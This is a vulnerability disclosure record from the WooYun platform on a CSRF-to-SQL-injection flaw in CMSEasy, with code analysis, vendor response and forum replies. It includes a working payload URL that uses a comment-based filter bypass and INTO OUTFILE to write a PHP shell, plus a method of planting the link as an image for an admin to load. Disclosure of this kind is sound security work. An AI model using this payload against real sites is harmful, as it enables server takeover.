{"id": 49187, "wybug_id": "wooyun-2014-074869", "wybug_title": "cmseasy csrf导致sql注入绕过union getshell", "wybug_corp": "cmseasy", "wybug_author": "menmen519", "wybug_date": "2014-09-03 17:50", "wybug_open_date": "2014-12-02 17:52", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-08：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-02：\t细节向公众公开  简要描述： 上一次做了一个csrf+sql注入getshell的 这一次我继续发一个，由于此属于一个get类型的，所以很简单的，管理员根本就不用去点击，就能触发sql并且getshell 详细说明：  首先我们分析一下sql语句：admin/live/header.php:(line:16-21)\ninclude('../../include/config.inc.php');include(CE_ROOT.'/include/admin/check.inc.php');include(CE_ROOT.'/include/celive.class.php');$admin_header = new celive();$admin_header->template();$admin_header->admin_xajax_live();\n然后我们跟到admin_xajax_live这个函数里面看看:\nfunction admin_xajax_live() {        if (!$this->admin_xajax_live_flag) {            $this->admin_xajax_live_flag=true;            include_once(dirname(__FILE__).'/xajax.inc.php');            include_once(dirname(__FILE__).'/xajax.class.php');            global $admin_xajax_live;            $admin_xajax_live=new xajax();            $admin_xajax_live->setCharEncoding('utf-8');            $admin_xajax_live->decodeUTF8InputOn();            $admin_xajax_live->registerFunction('ChangeStatus');            $admin_xajax_live->registerFunction('AdminResponse');            $admin_xajax_live->registerFunction('AdminSound');            $admin_xajax_live->registerFunction('AdminDecline');            $admin_xajax_live->registerFunction('AdminChatHistory');            $admin_xajax_live->registerFunction('AdminPostdata');            $admin_xajax_live->registerFunction('EndChats');            $admin_xajax_live->registerFunction('GetEndChat');            $admin_xajax_live->registerFunction('AdminExit');            $admin_xajax_live->processRequests();        }    }\n看到注册函数这里了有一个GetEndChat：\nfunction GetEndChat($chatid) {    global $db;        $objResponse = new xajaxResponse('utf-8');    $sql = \"SELECT `status` FROM `chat` WHERE `id`='\" . $chatid . \"'\";    @$result = $db->query($sql);    if ($result[0]['status'] == 0) {        $objResponse->script(\"alert('<?php echo $lang[reception]?>');window.parent.close();\");    }    return $objResponse;}\n然而这个$chatid没有做任何过滤就被传递进来了，之前有人对这里前台进行分析过：http://site.com/CmsEasy_5.5_UTF-8_20140818/uploads/celive/admin/live/header.php?xajax=GetEndChat&xajaxargs=xxxxx' union select/**/'<?php phpinfo?>' into outfile 'D:/APMSERVER/APMServ5.2.6/www/htdocs/CmsEasy_5.5_UTF-8_20140818/uploads/upload/images/shell.php'#这里我们要说明一下，由于全局对危险函数做了过滤和检测select后面要是不添加/**/这里是被拦截的然后我们队此url进行url编码：下来我们以游客身份进行投稿：\n\n到这里大家应该就明白了，管理员是要审核的，我们这里把这个get链接，发给了一个图片，管理员审核的时候，看到图片其实我们的请求就已经发出去了，当然了在响应的目录下面也已经生成了，shellcode\n\n我们再看看uploads/img底下有没有我们想要的文件:\n\n对了这里差两个括号，补上就是了。。。。。。ok到此.............   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-09-05 13:09 厂商回复： 祝节日快乐 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-03 17:52 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  哥  我就知道你的沙发依旧是我    \n     2014-09-03 19:23 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  最近的通用型都很快 $...    \n     2014-09-04 06:53 |    \t\t存在敏感词 \t\t\t( 实习白帽子  |\t\t\t        Rank:66 漏洞数:9        | 昵称存在敏感词)\t\t \n  @铁蛋火车侠 这么基情    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}